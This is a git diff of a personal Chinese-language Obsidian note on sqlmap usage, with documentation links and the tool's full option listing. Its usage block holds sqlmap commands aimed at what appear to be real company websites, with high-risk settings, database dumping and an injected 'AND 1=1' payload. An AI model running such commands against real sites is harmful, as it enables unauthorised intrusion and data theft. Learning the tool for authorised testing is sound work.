@@ -1,20 +1,20 @@
 ---
-data: a
-title: a
-category: a
-parrent: [[999 工具地圖]]
-aliases: a 
-tags: a
 date: 2022-06-23
-modified: 2022-07-08
+modified: 2022-07-14
 ---
-> 只針對比較常用的寫
+## Metadata
+up:: [[999 工具地圖]]
+
 ---
-**Source**
-**[官方文件](https://github.com/sqlmapproject/sqlmap/wiki/Usage)，
-[全參數中文詳解CSDN](https://blog.csdn.net/Breeze_CAT/article/details/80628392)**
+## Info
+```ad-info
+title: 只針對比較常用的寫
+
+[官方文件](https://github.com/sqlmapproject/sqlmap/wiki/Usage)
+[全參數中文詳解CSDN](https://blog.csdn.net/Breeze_CAT/article/details/80628392)
+```
 ---
-# Usage
+## Usage
 ```python=
 $ sqlmap -u https://www.secom.com.tw/news/detail.html?id=131 --force-ssl --dbms MySQL -v 3 --level 5 --risk 3 --dump MySQL --dbs
 $ sqlmap -u https://www.secom.com.tw/news/detail.html?id=131+AND+1%3D1+--+
@@ -27,20 +27,11 @@ $ sqlmap -u https://www.caco.com.tw/security/memberidentify/login --data="id=ddf
 ```
 
 
-123
----
-# [[sqlmap note]]
+## Note
+### Basic
+[[sqlmap.note]]
 
-# Advanced
-## Topic
-
-## Topic
-
-## Topic
-
-# Param
-## 
-
+### ALL Param
 ```
 Options:
   -h, --help            Show basic help message and exit
@@ -315,6 +306,3 @@ Options:
     --update            Update sqlmap
     --wizard            Simple wizard interface for beginner users
 ```
-
-# Source
-[source](https://)
